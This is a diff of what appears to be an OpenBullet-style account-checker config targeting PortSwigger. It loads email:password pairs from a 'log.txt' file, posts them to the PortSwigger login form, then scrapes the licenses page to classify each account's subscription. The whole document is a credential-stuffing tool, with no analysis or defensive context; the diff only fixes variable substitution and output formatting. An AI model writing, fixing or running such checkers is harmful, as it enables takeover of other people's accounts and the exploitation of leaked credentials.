@@ -1,54 +1,55 @@
 ## PortSwigger Subscription Extraction
 ## Reads accounts from log.txt and extracts subscription information
-## Fixed variable substitution in form data: uses <email> and <password> syntax
+## Uses Translate block for proper variable substitution in form data
 
 FileReadLines "log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
-## Extract first account for testing
+## Extract first account
 SET VAR "account" $"<accounts[0]>"
 Split $"<account>" ":" -> VAR "creds"
 SET VAR "email" $"<creds[0]>"
 SET VAR "password" $"<creds[1]>"
 
-PRINT "Testing account: <email>" White
+PRINT "Account: <email>" White
 
 ## Step 1: GET login page
 HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
 SET VAR "loginPageRes" $"<SOURCE>"
-PRINT "✓ Fetched login page" White
+PRINT "✓ Login page fetched" White
 
-## Step 2: POST login credentials with form data containing email and password
-## KEY FIX: Use <email> and <password> literal syntax for variable substitution
+## Step 2: Build form data with proper variable substitution using Translate
+Translate "username=EMAIL_PLACEHOLDER&password=PASSWORD_PLACEHOLDER&action=default"
+  KEY "EMAIL_PLACEHOLDER" VALUE $"<email>"
+  KEY "PASSWORD_PLACEHOLDER" VALUE $"<password>"
+  -> VAR "formData"
+
+## POST login credentials with properly substituted form data
 HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
-  CONTENT "username=<email>&password=<password>&action=default"
+  CONTENT $"<formData>"
   CONTENTTYPE "application/x-www-form-urlencoded"
 SET VAR "loginRes" $"<SOURCE>"
-PRINT "✓ Posted credentials" White
+PRINT "✓ Credentials posted" White
 
-## Step 3: GET licenses page (cookies preserved from login)
+## Step 3: GET licenses page
 HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
 SET VAR "licensesRes" $"<SOURCE>"
-PRINT "✓ Fetched licenses page" White
+PRINT "✓ Licenses page fetched" White
 
-## Check for subscription types
-SET VAR "plan" ""
+## Check for subscription
+SET VAR "plan" "free"
 
 IF $"<licensesRes>" Contains "Professional"
   SET VAR "plan" "Professional"
-  PRINT "FOUND: <email> - Professional" Green
 ELSE
   IF $"<licensesRes>" Contains "Community"
     SET VAR "plan" "Community"
-    PRINT "FOUND: <email> - Community" Green
   ELSE
     IF $"<licensesRes>" Contains "Enterprise"
       SET VAR "plan" "Enterprise"
-      PRINT "FOUND: <email> - Enterprise" Green
-    ELSE
-      PRINT "NO: <email> - No paid subscription" Yellow
     ENDIF
   ENDIF
 ENDIF
 
-PRINT "Test complete" White
+## Output result
+PRINT "Result: <email> - <plan>" Green
